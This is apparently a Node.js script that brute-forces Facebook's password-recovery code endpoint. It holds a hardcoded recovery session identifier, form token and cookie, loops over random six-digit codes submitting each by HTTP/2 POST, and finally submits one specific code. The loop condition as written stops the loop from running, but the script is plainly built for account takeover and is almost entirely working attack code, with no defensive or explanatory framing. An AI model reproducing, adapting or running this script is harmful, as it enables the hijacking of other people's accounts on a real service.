'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand } = helpers;

const httpClient = new Http2Client(false);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  const cuid = 'AYikki_hJ5-KOhv_EmwJwMQJ6nnVwtcnEBqyufmo9kFkKqUxD1o-1jqwA2-e_BI3HpjZE4ESDWhdw8Ipgh6dHDz8wmujCsQltQkEtMa1Cgwqw_837KwPC6BRIoFATqSgPG3Ox2HXHU1ylPedV0SrFi8uDjsn2NWknjaPKLvM7f053A';
  const lsd = 'AVpc27UCaSo';
  const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
  const headers = {
    'Cookie': 'datr=F_YuaFQVmcfePVvsUJJtDvkK',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  const p = [];
  for (let i = 0, code; 0 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    log('end');
    httpClient.post(url, headers, 'lsd='+lsd+'&n=402796').then(res => log(res.statusCode));
  });
})();